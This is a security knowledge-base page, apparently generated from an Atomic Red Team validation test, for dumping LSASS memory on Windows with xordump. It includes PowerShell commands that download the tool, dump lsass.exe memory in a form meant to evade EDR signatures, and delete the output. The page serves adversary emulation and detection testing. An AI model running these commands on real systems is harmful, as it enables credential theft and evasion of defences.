---
atomic_guid: "86fc3f40-237f-4701-b155-81c01c48d697"
title: "Dump LSASS.exe using imported Microsoft DLLs"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "86fc3f40-237f-4701-b155-81c01c48d697"
  - "Dump LSASS.exe using imported Microsoft DLLs"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump LSASS.exe using imported Microsoft DLLs

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by
importing built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump 
file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.

Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.

## Metadata

- Atomic GUID: 86fc3f40-237f-4701-b155-81c01c48d697
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Input Arguments

### output_file

- description: Path where resulting dump should be placed
- type: path
- default: C:\Windows\Temp\lsass-xordump.t1003.001.dmp

### xordump_exe

- description: Path to xordump
- type: path
- default: C:\Windows\Temp\xordump.exe

## Dependencies

Computer must have xordump.exe

### Prerequisite Check

```text
if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}
```

### Get Prerequisite

```text
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
#{xordump_exe} -out #{output_file} -x 0x41
```

### Cleanup

```powershell
Remove-Item #{output_file} -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
